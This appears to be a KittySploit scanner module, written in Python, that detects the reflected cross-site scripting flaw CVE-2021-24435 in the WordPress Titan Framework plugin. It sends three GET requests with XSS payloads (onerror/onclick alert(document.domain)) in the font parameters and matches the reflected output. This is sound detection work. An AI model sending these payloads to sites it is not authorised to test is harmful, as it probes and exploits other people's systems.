#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The iframe-font-preview."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Titan Framework plugin <= 1.12.1 - Cross-Site Scripting Detection',
        'description': 'The iframe-font-preview.php file of the titan-framework does not properly escape the font-weight and font-family GET parameters before outputting them back in an href attribute, leading to Reflected Cross-Site Scripting issues.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'wp', 'xss', 'wp-plugin', 'titan-framework', 'wpscan', 'wordpress', 'gambit', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 3,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/a88ffc42-6611-406e-8660-3af24c9cc5e8',
            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24435',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-24435',
            'https://patchstack.com/database/vulnerability/titan-framework/wordpress-titan-framework-plugin-1-12-1-reflected-cross-site-scripting-xss-vulnerability',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2021-24435',
    }

    def run(self):
        for path in ('/titan-framework/lib/iframe-font-preview.php?font-type=google&font-family=%27/onerror=%27alert(document.domain)%27/b=%27', '/titan-framework/lib/iframe-font-preview.php?font-type=google&font-family=aaaaa&font-weight=%27%20onerror=alert(document.domain)%20b=%27', '/titan-framework/lib/iframe-font-preview.php?font-type=google&font-family=aaaaa&font-weight=%27%20accesskey=%27x%27%20onclick=%27alert(document.domain)%27%20class=%27'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            header_any = ('text/html',)
            body_regexes = ('(?i)(onerror=|onclick=)[\'"]?alert\\(document\\.domain\\)[\'"]?', '<p>Grumpy wizards make',)
            if (any(m in headers for m in header_any)) and (any(re.search(rx, body, 0) for rx in body_regexes)):
                self.set_info(
                    severity='medium',
                    reason="WordPress Titan Framework plugin <= 1.12.1 - Cross-Site Scripting detected",
                    path=path,
                )
                return True
        return False

